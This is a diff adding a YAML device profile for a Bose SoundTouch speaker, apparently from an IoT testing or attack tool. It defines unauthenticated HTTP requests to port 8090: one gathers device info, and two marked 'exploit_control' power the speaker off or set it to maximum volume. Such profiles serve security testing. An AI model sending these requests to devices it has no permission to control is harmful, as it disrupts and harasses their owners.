@@ -1,0 +1,40 @@
+id: bose-soundtouch
+device_type: speaker
+vendor: Bose
+family: soundtouch
+requires:
+  port: 8090
+actions:
+  - id: info
+    label: "Get device info"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8090/info"
+          save_as: info
+
+  - id: power-off
+    label: "Send POWER keypress"
+    category: exploit_control
+    dangerous: true
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8090/key"
+          method: POST
+          headers:
+            Content-Type: application/xml
+          body: '<key state="press" sender="Gabbo">POWER</key>'
+
+  - id: max-volume
+    label: "Set volume to 100"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "This will blast the speaker at max volume."
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8090/volume"
+          method: POST
+          headers:
+            Content-Type: application/xml
+          body: '<volume>100</volume>'
